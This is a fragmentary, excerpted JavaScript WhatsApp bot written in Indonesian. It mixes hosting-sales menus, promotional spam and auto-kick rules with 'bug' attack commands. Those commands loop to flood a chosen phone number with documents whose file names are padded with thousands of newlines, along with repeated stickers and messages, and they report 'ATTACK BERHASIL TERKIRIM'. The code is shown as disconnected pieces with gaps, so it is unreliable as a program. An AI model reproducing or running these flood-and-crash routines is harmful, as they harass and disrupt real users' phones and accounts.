...
item3.URL:https://chat.whatsapp.com/Ca1BzPQtn8o3PTYXG6sE31\n
...
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
 ...
 // Antipromosi
  if (antipromosi)
  if (budy.includes(`admin panel 15k`)) {
...
Biiofc.sendMessage(from, {text:`\`\`\`DI LUAR NALAR !!\`\`\`\n\n`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
  if (antipromosi)
...
// auto jpm
        ...
        await Biiofc.sendMessage(m.chat,
			...
			Biiofc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
			Biiofc.sendMessage(from, {text:`\`\`\`JOIN GUYS 700 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\nhttps://chat.whatsapp.com/Ky3YMvmXtrj9Zmkc9L5Eyr`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
            }            
        }
        ...
        await Biiofc.sendMessage(m.chat,
			...
			Biiofc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
			Biiofc.sendMessage(from, {text:`\`\`\`JOIN GUYS 700 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\n@${kice.split("@")[0]} https://chat.whatsapp.com/Ky3YMvmXtrj9Zmkc9L5Eyr`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
            }            
        }
...
// Anti Link
        ...
        await Biiofc.sendMessage(m.chat,
			...
			Biiofc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
			Biiofc.sendMessage(from, {text:`\`\`\`JOIN GUYS 700 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\n@${kice.split("@")[0]} https://chat.whatsapp.com/BkVmvc22ART0QDZaf9FAf8`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
            }            
        }
...
if (!isOwner) return reply(bvl)
        await Biiofc.sendMessage(m.chat,
			...
			Biiofc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Biiofc.sendMessage(from, {text:`\`\`\`JOIN GUYS 700 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\n@${m.sender.split("@")[0]} https://chat.whatsapp.com/Ky3YMvmXtrj9Zmkc9L5Eyr`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
...
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/9bd25193f888ed255e35a.jpg',
sourceUrl: "https://chat.whatsapp.com/Ca1BzPQtn8o3PTYXG6sE31",
mediaType: 1,
...
break
case "scmenu": {
if (!isOwner) return reply(`Khusus BellzHosting Aja`)
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*
...
break
case "Flax": {
if (!isOwner) return reply(`Khusus Flax Aja`)
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*
...
_LIST MENU BUG BY *© FLAX HOSTING*_
▬▭▬▭▬▭▬▭▬▭▬▭▬▭
...
const version = require("baileys/package.json").version
const textoto = `*Hi @${sender.split("@")[0]} 👋*
▬▭( *LIST VPS BY FlaxMalesin* )▭▬
*OTOMATIS SEMUA ASAL ADA SALDO*
SALDO ANDA : Rp : ${toRupiah(cekSaldo(sender, db_saldo))}

⭔ VPS RAM 2GB CORE 1 : 30K
⭔ VPS RAM 2GB CORE 2 : 40K
⭔ VPS RAM 4GB CORE 2 : 50K
⭔ VPS RAM 8GB CORE 4 : 60K
⭔ VPS RAM 16GB CORE 8 : 85K
...
break
case "creategc":{
if (!isOwner) return reply(`Ngapain ? Khusus BellzHosting Aja !!`)
...
break
case 'domainmenu':{
if (!isOwner) return reply(`Ngapain ? Domain Privasi, Hanya Bisa Oleh Owner Flax Hosting`)
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*
...
mediaType:  1,
mediaUrl: 'https://wa.me/6281958880336',
title: `BellzHosting`,
sourceUrl: `https://wa.me/6281958880336`, 
thumbnail: thumb
}
}})
}
...
if (!isBotAdmins) return reply(mess.only.badmin)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281958880336`)
...
if (!isOwner) return reply(`Ngapain ? Khusus BellzHosting Aja !!`)
                ...
                break
  case 'randomcecan1':{
if (!isOwner) return reply(`Ngapain ? Khusus FlaxMalesin Aja !!`)
...
break
case 'sewabot':
if (!isOwner) return reply(`Khusus FlaxMalesin Aja`)
...
break
case 'buysewa':
reply(`¥ *Price Sewa Bot FlaxMalesin* €
...
break
case'promoteall':
if (!isOwner) return reply('*Khusus FlaxMalesin Doang Woii!!*')
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
...
break
case 'block':{
if (!isOwner) return reply(`Ngapain ? Khusus FLAX HOSTING Aja !!`)
...
break
case "getorder":{
if (!isOwner) return reply(`Ngapain ? Khusus FLAX Aja !!`)
...
case 'svps': case 'sendvps': {
		 if (!isOwner) return reply(`Ngapain ? Khusus Flax Offcial Aja !!`)
...
case 'domain34': case 'domain35': {
     ...
     break
          case 'domain36': {
    if (!jangan) return m.reply("Fitur Ini Khusus Untuk Reseller Subdomain RaffOffcial\nMau Join? Cuman 5.000 Ajaa\n\nHubungi Wa.me/6282196776245")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
    ...
    if (!jangan) return m.reply("Fitur Ini Khusus Untuk Reseller Subdomain RaffOffcial\nMau Join? Cuman 5.000 Ajaa\n\nHubungi Wa.me/6282196776245")
           ...
           break
          case 'domain38': {
    if (!jangan) return m.reply("Fitur Ini Khusus Untuk Reseller Subdomain Raff\nMau Join? Cuman 5.000 Ajaa\n\nHubungi Wa.me/6282196776245")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
    ...
    if (!jangan) return m.reply("Fitur Ini Khusus Untuk Reseller Subdomain RaffOffcial\nMau Join? Cuman 5.000 Ajaa\n\nHubungi Wa.me/6282196776245")
           ...
           break
          case 'domain40': {
    if (!jangan) return m.reply("Fitur Ini Khusus Untuk Reseller Subdomain RaffOffcial\nMau Join? Cuman 5.000 Ajaa\n\nHubungi Wa.me/6282196776245 id")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
...
break
          case 'qris': {
Biiofc.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/7984114f47c521962d772.jpg' }, caption: `JAN LUPA SS BUKTI DAN NOMINALNYA YA 
...
break
case 'reinstall': {
if (!isOwner) return reply(`Khusus Raff Offcial Aja`)
let srv = args[0]
...
https://chat.whatsapp.com/I1bXdgSg0xV3F9tUUK0WPN
...
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@BellzHosting", 
"sourceUrl": "https://youtube.com/@BellzHosting" }}}, { quoted: m })
}
break
...
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(prrkek, { document: thumb, caption: "RaffOffcial Bug🔥`", fileName: `RaffOffcial Bug🔥 ⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${button}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid" }, { quoted: lep })
Biiofc.sendMessage(prrkek, { document: thumb, caption: "YOUTUBE RaffOffcial OFFCIAL`", fileName: `RaffOffcial Bug🔥 ⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${button}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid" }, { quoted: lep })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×
...
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendStimg(prrkek, ppuser, lep, { packname: "RaffOffcial Bug🔥", author: "" })
Biiofc.sendStimg(prrkek, ppuser, lep, { packname: "RaffOffcial Bug🔥", author: "" })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
...
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": "Youtube RaffOffcial`",
"message": `${button}`,
"sellerJid": "6282196776245@s.whatsapp.net",
...
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(mnm, { text: "RaffOffcial Bug🔥`" }, { quoted: lep })
Biiofc.sendMessage(mnm, { text: "RaffOffcial Bug🔥`" }, { quoted: lep })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${mnm.split("@")[0]}
...
case 'premlist':{
if (!isOwner) return reply(mess.owner)
let listprem =`*LIST SELER Raff OFFCIAL*\n\nTotal Seller : ${owner.length}\n`
var no = 1
for (let x of owner) {
listprem +=`\nUser: ${no++}\nID: ${x}\n\n`
}
...
case "listgroup":{
if (!isOwner) return reply(`Ngapain ? Khusus Raff Offcial Aja !!`)
let getGroups = await Biiofc.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let hituet = 0
...
reply("*SUCCESFUL TUAN Bellz✅*")
}
break
case "out": case "verif":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62819588803363`)
...
Biiofc.sendMessage(from, {text: `\`\`\`JOIN GUYS 700 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\nhttps://chat.whatsapp.com/Ca1BzPQtn8o3PTYXG6sE31`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
...
Biiofc.sendMessage(from, {text: `「 *ANTI PROMOSI PANEL* 」\n\nApa? Panel? Beli Di Admin Sini Aja, Yg Lain Jelek, Cepet Down, Lemot, Banyak Masalah!\n\nMau? Chat Ke:\nwa.me/6281958880336`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
